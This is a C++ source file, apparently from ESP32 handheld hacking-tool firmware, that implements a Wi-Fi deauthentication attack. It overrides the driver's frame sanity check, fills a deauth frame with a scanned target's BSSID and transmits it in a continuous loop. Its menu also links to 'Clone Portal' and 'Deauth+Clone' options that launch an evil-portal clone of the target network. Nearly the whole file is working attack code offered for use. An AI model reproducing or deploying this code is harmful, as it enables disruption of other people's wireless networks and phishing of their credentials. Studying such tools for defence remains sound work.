// Borrowed from https://github.com/justcallmekoko/ESP32Marauder/
// Learned from https://github.com/risinek/esp32-wifi-penetration-tool/
// Arduino IDE needs to be tweeked to work, follow the instructions: https://github.com/justcallmekoko/ESP32Marauder/wiki/arduino-ide-setup
// But change the file in: C:\Users\<YOur User>\AppData\Local\Arduino15\packages\m5stack\hardware\esp32\2.0.9
#include <Arduino.h>
#include "globals.h"
#include "wifi_atks.h"
#include "esp_wifi.h"
#include "esp_system.h"
#include "display.h"
#include "mykeyboard.h"
#include "evil_portal.h"
#include "wifi_common.h"


/**
 * @brief Decomplied function that overrides original one at compilation time.
 * 
 * @attention This function is not meant to be called!
 * @see Project with original idea/implementation https://github.com/GANESH-ICMC/esp32-deauther
*/
extern "C" int ieee80211_raw_frame_sanity_check(int32_t arg, int32_t arg2, int32_t arg3){
    if (arg == 31337)
      return 1;
    else
      return 0;
}


// Default Drauth Frame
const uint8_t deauth_frame_default[] = {
    0xc0, 0x00, 0x3a, 0x01,
    0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0xf0, 0xff, 0x02, 0x00
};

uint8_t deauth_frame[sizeof(deauth_frame_default)]; // 26 = [sizeof(deauth_frame_default[])]

wifi_ap_record_t ap_record;  


/***************************************************************************************
** Function: send_raw_frame
** @brief: Broadcasts deauth frames
***************************************************************************************/
void wsl_bypasser_send_raw_frame(const uint8_t *frame_buffer, int size){
    //Serial.begin(115200);
    ESP_ERROR_CHECK(esp_wifi_80211_tx(WIFI_IF_AP, frame_buffer, size, false));
    //Serial.println(" -> Sent deauth frame");
    delay(5);
}


/***************************************************************************************
** function: wsl_bypasser_send_raw_frame
** @brief: prepare the frame to deploy the attack
***************************************************************************************/
void wsl_bypasser_send_raw_frame(const wifi_ap_record_t *ap_record, uint8_t chan){
    Serial.begin(115200);
    Serial.print("\nPreparing deauth frame to -> ");
    for (int j = 0; j < 6; j++) {
    Serial.print(ap_record->bssid[j], HEX);
    if (j < 5) Serial.print(":");
    }
    esp_wifi_set_channel(chan, WIFI_SECOND_CHAN_NONE);
    delay(50);
    memcpy(&deauth_frame[10], ap_record->bssid, 6);
    memcpy(&deauth_frame[16], ap_record->bssid, 6);
}


/***************************************************************************************
** function: wifi_atk_info
** @brief: Open Wifi information screen
***************************************************************************************/
void wifi_atk_info(String tssid,String mac, uint8_t channel) {
  //desenhar a tela
  drawMainMenu();
  menu_op.deleteSprite();
  menu_op.createSprite(WIDTH-20, HEIGHT-35);
  menu_op.fillRect(0,0, menu_op.width(),menu_op.height(), BGCOLOR);
  menu_op.setTextColor(FGCOLOR);
  menu_op.drawCentreString("-=Information=-", menu_op.width()/2,2,SMOOTH_FONT);
  menu_op.drawString("AP: " + tssid,0,20);
  menu_op.drawString("Channel: " + String(channel),0,38);
  menu_op.drawString(mac,0,55);
  menu_op.drawString("Press " + String(BTN_ALIAS) + " to act",0,menu_op.height()-20);
  menu_op.pushSprite(6,26);
  menu_op.deleteSprite();

  delay(300);
  while(!checkSelPress()) {
    while(!checkSelPress()) { yield(); } // timerless debounce
    target_atk_menu(tssid, mac, channel);
    returnToMenu=true;
    break;
  }

}


/***************************************************************************************
** function: target_atk_menu
** @brief: Open menu to choose which AP Attack
***************************************************************************************/
void wifi_atk_menu() {
    int nets;
    WiFi.mode(WIFI_MODE_STA);
    displayScanning();
    nets=WiFi.scanNetworks();
    options = {  };
    for(int i=0; i<nets; i++){
      options.push_back({WiFi.SSID(i).c_str(), [=]() { 
        //criar o frame
        memcpy(ap_record.bssid, WiFi.BSSID(i), 6);
        uint8_t chan = static_cast<uint8_t>(WiFi.channel(i));
        target_atk_menu(WiFi.SSID(i).c_str(), WiFi.BSSIDstr(i), chan); }});
    }

    options.push_back({"Main Menu", [=]()     { backToMenu(); }});

    delay(200);
    loopOptions(options);
    delay(200);
}
/***************************************************************************************
** function: target_atk_menu
** @brief: Open menu to choose which AP Attack
***************************************************************************************/
void target_atk_menu(String tssid,String mac, uint8_t channel) {
    options = { 
      {"Information", [=]()   { wifi_atk_info(tssid, mac, channel); }},
      {"Deauth", [=]()        { target_atk(tssid, mac, channel); }},
      {"Clone Portal", [=]()  { startEvilPortal(tssid, channel,false); }},
      {"Deauth+Clone", [=]()  { startEvilPortal(tssid, channel,true); }},
      {"Main Menu", [=]()     { backToMenu(); }}, 
    };

    delay(200);
    loopOptions(options);
    delay(200);
}


/***************************************************************************************
** function: target_atk
** @brief: Deploy Target deauth
***************************************************************************************/
void target_atk(String tssid,String mac, uint8_t channel) {
  Serial.begin(115200);

  WiFi.mode(WIFI_AP);
  if(!WiFi.softAP(tssid, emptyString, channel, 1, 4, false)) {
    displayError("Falha 1");
    while(!checkSelPress()) { yield(); }
  }
  wifiConnected=true;
  memcpy(deauth_frame, deauth_frame_default, sizeof(deauth_frame_default));
  wsl_bypasser_send_raw_frame(&ap_record,channel);

  //loop com o ataque mostrando o numero de frames por segundo
  int tmp = 0;
  int count = 0;
  tmp=millis();
  bool redraw = true;
  delay(200);
  checkSelPress();





  drawMainMenu();
  while(1) {
    if(redraw) {
      //desenhar a tela
      menu_op.deleteSprite();
      menu_op.createSprite(WIDTH-20, HEIGHT-35);
      menu_op.fillRect(0,0, menu_op.width(),menu_op.height(), BGCOLOR);
      menu_op.setTextColor(TFT_RED);
      menu_op.drawCentreString("Target Deauth", menu_op.width()/2,2,SMOOTH_FONT);
      menu_op.setTextColor(FGCOLOR);
      menu_op.drawString("AP: " + tssid,0,20);
      menu_op.drawString("Channel: " + String(channel),0,38);
      menu_op.drawString(mac,0,55);
      menu_op.pushSprite(6,26);
      redraw=false;
    }
    //Send frame
    wsl_bypasser_send_raw_frame(deauth_frame, sizeof(deauth_frame_default));
    count++;
    // atualize counter
    if(millis()-tmp>1000) {
      menu_op.setCursor(0,menu_op.height()-17);
      menu_op.fillRect(0,menu_op.height()-17, menu_op.width(),17, BGCOLOR);
      menu_op.print("Frames: " + String(count) + "/s");
      menu_op.pushSprite(6,26);
      count=0;
      tmp=millis();
    }
    //Pause attack
    if(checkSelPress()) {
      displayRedStripe("Deauth Paused",TFT_WHITE,FGCOLOR);
      while(checkSelPress()) { delay(50); } // timeless debounce
      // wait to restart or kick out of the function
      while(!checkSelPress()) { 
        #ifndef CARDPUTER
          if(checkPrevPress()) break; // Apertar o botão power dos sticks
        #else
          Keyboard.update();
          if(Keyboard.isKeyPressed('`')) break; // Apertar o ESC do cardputer
        #endif
      }
      while(checkSelPress()) { delay(50); } // timeless debounce
      redraw=true;
    }    
    // Checks para sair do while
  #ifndef CARDPUTER
    if(checkPrevPress()) break; // Apertar o botão power dos sticks
  #else
    Keyboard.update();
    if(Keyboard.isKeyPressed('`')) break; // Apertar o ESC do cardputer
  #endif
  }
  wifiDisconnect();
  returnToMenu=true;
}




